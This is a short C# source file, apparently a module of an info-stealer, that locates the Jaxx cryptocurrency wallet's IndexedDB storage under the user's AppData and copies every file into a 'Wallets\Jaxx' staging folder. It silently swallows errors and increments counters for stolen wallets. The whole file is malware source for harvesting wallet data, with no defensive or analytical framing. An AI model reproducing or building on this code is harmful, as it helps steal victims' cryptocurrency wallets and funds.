using System.IO;

namespace SHARP
{
    internal class Jaxx
    {
      public static string JaxxDir = "\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";

      public static void JaxxStr(string directorypath)
      {
        try
        {
          foreach (FileInfo file in new DirectoryInfo(Help.AppData + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\").GetFiles())
          {
            Directory.CreateDirectory(directorypath + Jaxx.JaxxDir);
            file.CopyTo(directorypath + Jaxx.JaxxDir + file.Name);
          }
          ++Counting.jaxx;
          ++Counting.Wallets;
        }
        catch
        {
        }
      }
    }
}
